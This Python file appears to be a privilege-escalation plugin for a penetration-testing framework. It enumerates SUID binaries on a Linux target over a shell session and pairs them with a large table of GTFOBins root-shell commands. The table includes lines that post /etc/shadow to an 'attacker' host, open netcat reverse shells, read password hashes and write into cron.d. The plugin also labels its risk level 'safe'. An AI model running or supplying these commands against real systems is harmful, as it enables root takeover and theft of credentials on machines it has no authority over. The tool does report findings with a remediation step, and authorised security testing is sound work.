"""SUID exploit — GTFOBins SUID binary exploitation."""

from __future__ import annotations

import logging
from typing import ClassVar

from basilisk.core.plugin import BasePlugin, PluginCategory, PluginMeta
from basilisk.models.result import Finding, PluginResult
from basilisk.models.target import Target

logger = logging.getLogger(__name__)

# GTFOBins SUID binaries with exploitation commands
GTFOBINS_SUID: dict[str, str] = {
    "python": 'python -c \'import os; os.execl("/bin/sh", "sh", "-p")\'',
    "python3": 'python3 -c \'import os; os.execl("/bin/sh", "sh", "-p")\'',
    "perl": "perl -e 'exec \"/bin/sh\";'",
    "ruby": "ruby -e 'exec \"/bin/sh\"'",
    "bash": "bash -p",
    "sh": "sh -p",
    "dash": "dash -p",
    "zsh": "zsh",
    "env": "/usr/bin/env /bin/sh -p",
    "find": "find . -exec /bin/sh -p \\; -quit",
    "nmap": "nmap --interactive (then !sh)",
    "vim": "vim -c ':!/bin/sh'",
    "vi": "vi -c ':!/bin/sh'",
    "nano": "nano → Ctrl+R → Ctrl+X → /bin/sh",
    "less": "less /etc/passwd → !/bin/sh",
    "more": "more /etc/passwd → !/bin/sh",
    "awk": "awk 'BEGIN {system(\"/bin/sh\")}'",
    "gawk": "gawk 'BEGIN {system(\"/bin/sh\")}'",
    "cp": "cp /bin/sh /tmp/sh && chmod +s /tmp/sh",
    "tar": "tar cf /dev/null testfile --checkpoint=1 --checkpoint-action=exec=/bin/sh",
    "zip": "zip /tmp/x.zip /etc/passwd -T -TT '/bin/sh #'",
    "gcc": "gcc -wrapper /bin/sh,-s .",
    "make": "make -s --eval=$'x:\\n\\t-/bin/sh' x",
    "pkexec": "pkexec /bin/sh",
    "php": "php -r \"pcntl_exec('/bin/sh', ['-p']);\"",
    "node": "node -e 'require(\"child_process\").spawn(\"/bin/sh\",[\"-p\"],{stdio:[0,1,2]})'",
    "lua": "lua -e 'os.execute(\"/bin/sh\")'",
    "strace": "strace -o /dev/null /bin/sh -p",
    "ltrace": "ltrace -b -L /bin/sh -p",
    "gdb": "gdb -nx -ex '!sh' -ex quit",
    "docker": "docker run -v /:/mnt --rm -it alpine chroot /mnt sh",
    "systemctl": "systemctl (then !sh in pager)",
    "journalctl": "journalctl (then !/bin/sh in pager)",
    "mount": "mount -o bind /bin/sh /bin/mount",
    "wget": "wget --post-file=/etc/shadow http://attacker/",
    "curl": "curl file:///etc/shadow",
    "nc": "nc attacker 4444 -e /bin/sh",
    "ncat": "ncat attacker 4444 -e /bin/sh",
    "socat": "socat stdin exec:/bin/sh",
    "ssh": "ssh -o ProxyCommand=';sh 0<&2 1>&2' x",
    "tee": "echo DATA | tee /etc/cron.d/x",
    "screen": "screen (terminal emulator → shell)",
    "tmux": "tmux (terminal multiplexer → shell)",
    "script": "script -q /dev/null",
    "ed": "ed → !/bin/sh",
    "sed": "sed -n '1e exec sh 1>&0' /etc/hosts",
    "openssl": "openssl enc (reverse shell possible)",
    "busybox": "busybox sh",
    "base64": "base64 /etc/shadow | base64 -d",
    "dd": "dd if=/etc/shadow",
    "ftp": "ftp → !/bin/sh",
    "git": "git help config → !/bin/sh",
    "head": "head (limited SUID use)",
    "jq": "jq -Rr . /etc/shadow",
    "ksh": "ksh -p",
    "man": "man man → !/bin/sh",
    "nice": "nice /bin/sh -p",
    "nl": "nl /etc/shadow",
    "od": "od -An -c /etc/shadow",
    "rlwrap": "rlwrap /bin/sh -p",
    "rpm": "rpm --eval '%{lua:os.execute(\"/bin/sh\")}'",
    "rsync": "rsync -e 'sh -p' . localhost:/dev/null",
    "sort": "sort -m /etc/shadow",
    "sqlite3": "sqlite3 /dev/null '.shell /bin/sh'",
    "time": "/usr/bin/time /bin/sh -p",
    "unshare": "unshare /bin/sh",
    "watch": "watch -x /bin/sh -p",
    "xargs": "xargs -a /dev/null /bin/sh -p",
}


class SuidExploitPlugin(BasePlugin):
    meta: ClassVar[PluginMeta] = PluginMeta(
        name="suid_exploit",
        display_name="SUID Binary Exploitation",
        category=PluginCategory.PRIVESC,
        description="GTFOBins SUID binary discovery and exploitation guidance",
        depends_on=["linux_enum"],
        produces=["privesc_vectors"],
        timeout=60.0,
        requires_http=False,
        requires_shell=True,
        platform="linux",
        risk_level="safe",
    )

    async def run(self, target: Target, ctx) -> PluginResult:
        findings: list[Finding] = []
        data: dict = {"exploitable_suids": [], "total_suids": 0}

        # Try to get SUID data from linux_enum
        enum_result = ctx.pipeline.get(f"linux_enum:{target.host}")
        suid_binaries: list[str] = []

        if enum_result and enum_result.ok:
            suid_binaries = enum_result.data.get("suid_binaries", [])
        else:
            # Fall back to direct enumeration
            shells = ctx.state.get("active_shells", [])
            if not shells or not ctx.shell:
                return PluginResult.fail(
                    self.meta.name, target.host, error="No shell session",
                )
            session = (
                ctx.shell.get_session(shells[0]["id"])
                if isinstance(shells[0], dict) else None
            )
            if session:
                output = await ctx.shell.execute(
                    session,
                    "find / -perm -4000 -type f 2>/dev/null",
                    timeout=15.0,
                )
                if output:
                    suid_binaries = output.strip().splitlines()

        data["total_suids"] = len(suid_binaries)

        for binary_path in suid_binaries:
            name = binary_path.split("/")[-1]
            if name in GTFOBINS_SUID:
                exploit_cmd = GTFOBINS_SUID[name]
                data["exploitable_suids"].append({
                    "binary": binary_path,
                    "name": name,
                    "exploit": exploit_cmd,
                    "reference": f"https://gtfobins.github.io/gtfobins/{name}/#suid",
                })

        if data["exploitable_suids"]:
            evidence_lines = [
                f"{e['binary']} → {e['exploit'][:60]}"
                for e in data["exploitable_suids"][:15]
            ]
            findings.append(Finding.critical(
                f"Exploitable SUID binaries: {len(data['exploitable_suids'])}",
                evidence="\n".join(evidence_lines),
                description="These SUID binaries can be exploited for root access",
                remediation="Remove unnecessary SUID bits: chmod u-s <binary>",
                tags=["privesc", "suid", "gtfobins"],
            ))
        else:
            findings.append(Finding.info(
                f"No exploitable SUID binaries among {data['total_suids']} found",
                tags=["privesc", "suid"],
            ))

        return PluginResult.success(
            self.meta.name, target.host, findings=findings, data=data,
        )
